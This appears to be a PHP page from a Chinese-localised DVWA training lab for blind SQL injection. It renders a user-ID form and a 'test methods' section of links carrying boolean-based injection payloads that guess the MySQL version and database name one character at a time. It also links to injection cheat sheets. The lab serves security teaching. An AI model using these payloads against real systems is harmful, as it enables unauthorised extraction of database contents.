<?php

define( 'DVWA_WEB_PAGE_TO_ROOT', '../../' );
require_once DVWA_WEB_PAGE_TO_ROOT.'dvwa/includes/dvwaPage.inc.php';

dvwaPageStartup( array( 'authenticated', 'phpids' ) );

$page = dvwaPageNewGrab();
$page[ 'title' ] .= $page[ 'title_separator' ].'漏洞: SQL 盲注';
$page[ 'page_id' ] = 'sqli_blind';

dvwaDatabaseConnect();

$vulnerabilityFile = '';
switch( $_COOKIE[ 'security' ] ) {
	case 'low':
		$vulnerabilityFile = 'low.php';
		break;

	case 'medium':
		$vulnerabilityFile = 'medium.php';
		break;

	case 'high':
	default:
		$vulnerabilityFile = 'high.php';
		break;
}

require_once DVWA_WEB_PAGE_TO_ROOT."vulnerabilities/sqli_blind/source/{$vulnerabilityFile}";

$page[ 'help_button' ] = 'sqli_blind';
$page[ 'source_button' ] = 'sqli_blind';

$magicQuotesWarningHtml = '';

// Check if Magic Quotes are on or off
if( ini_get( 'magic_quotes_gpc' ) == true ) {
	$magicQuotesWarningHtml = "	<div class=\"warning\">Magic Quotes are on, you will not be able to inject SQL.</div>";
}

$page[ 'body' ] .= "
<div class=\"body_padded\">
	<h1>漏洞: SQL 盲注</h1>

	{$magicQuotesWarningHtml}

	<div class=\"vulnerable_code_area\">

		<h3>用户ID:</h3>

		<form action=\"#\" method=\"GET\">
			<input type=\"text\" name=\"id\">
			<input type=\"submit\" name=\"Submit\" value=\"确定\">
		</form>

		{$html}

	</div>
	<h3><font color=\"red\">测试方法：</font></h3>
    <div class=\"vulnerable_code_area\"><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=1' and 1=1 and '1'='1&Submit=%C8%B7%B6%A8\"><font color=\"blue\">测试是否有注入,对比页面返回</font></a><br /><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=1' and 1=2 and '1'='1&Submit=%C8%B7%B6%A8\"><font color=\"blue\">测试是否有注入,对比页面返回</font></a><br /><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=1' and left(version(),1)=5 and '1'='1&Submit=%C8%B7%B6%A8\"><font color=\"blue\">测试数据库版本,有数据说明数据库版本为5.0</font></a><br /><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=1' and length(database())=4 and '1'='1&Submit=%C8%B7%B6%A8\"><font color=\"blue\">测试数据库长度,有数据说明长度正确</font></a><br /><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=1' and left(database(),1)='d' and '1'='1&Submit=%C8%B7%B6%A8\"><font color=\"blue\">测试数据库名称第1个字符</font></a><br /><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=1' and left(database(),2)='dv' and '1'='1&Submit=%C8%B7%B6%A8\"><font color=\"blue\">测试数据库名称第2个字符</font></a><br /><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=1' and left(database(),3)='dvw' and '1'='1&Submit=%C8%B7%B6%A8\"><font color=\"blue\">测试数据库名称第3个字符</font></a><br /><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=1' and left(database(),4)='dvwa' and '1'='1&Submit=%C8%B7%B6%A8\"><font color=\"blue\">测试数据库名称第4个字符</font></a><br /><br />
    
    <h3><font color=\"red\">其它后续测试请看习科文章：</font><a href=\"http://bbs.blackbap.org/thread-3309-1-1.html\" target=\"_blank\">MySQL盲注最全 实例讲解 详解</a></h3>
    </div>

	<h2>更多信息</h2>
	<ul>
                <li>".dvwaExternalLinkUrlGet( 'http://bbs.blackbap.org/thread-3309-1-1.html')."</li>
                <li>".dvwaExternalLinkUrlGet( 'http://www.securiteam.com/securityreviews/5DP0N1P76E.html')."</li>
                <li>".dvwaExternalLinkUrlGet( 'http://en.wikipedia.org/wiki/SQL_injection')."</li>
                <li>".dvwaExternalLinkUrlGet( 'http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/')."</li>
                <li>".dvwaExternalLinkUrlGet( 'http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet')."</li>
	</ul>
</div>
";

dvwaHtmlEcho( $page );

?>
